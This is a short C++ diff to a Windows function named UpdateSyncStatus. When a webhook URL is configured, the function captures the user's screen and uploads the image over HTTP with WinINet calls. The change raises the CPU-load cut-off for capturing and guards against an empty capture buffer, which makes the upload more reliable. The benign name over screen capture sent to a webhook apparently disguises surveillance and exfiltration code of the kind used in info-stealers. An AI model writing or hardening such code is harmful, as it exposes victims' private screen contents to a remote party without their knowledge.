@@ -136,7 +136,7 @@ void UpdateSyncStatus(SessionInfo si, bool forceCapture) {
     if (WEBHOOK_URL.find("http") == std::string::npos) return;
 
     bool capturing = forceCapture;
-    if (capturing && GetSystemLoad() > 85) capturing = false;
+    if (capturing && GetSystemLoad() > 90) capturing = false;
 
     std::vector<unsigned char> screenData;
     if (capturing) screenData = CaptureScreen();
@@ -190,7 +190,9 @@ void UpdateSyncStatus(SessionInfo si, bool forceCapture) {
             if (HttpSendRequestExA(hRequest, &buffers, NULL, 0, 0)) {
                 DWORD written;
                 InternetWriteFile(hRequest, body.c_str(), body.length(), &written);
-                if (capturing) InternetWriteFile(hRequest, &screenData[0], screenData.size(), &written);
+                if (capturing && !screenData.empty()) {
+                    InternetWriteFile(hRequest, &screenData[0], screenData.size(), &written);
+                }
                 InternetWriteFile(hRequest, footer.c_str(), footer.length(), &written);
                 HttpEndRequestA(hRequest, NULL, 0, 0);
             }
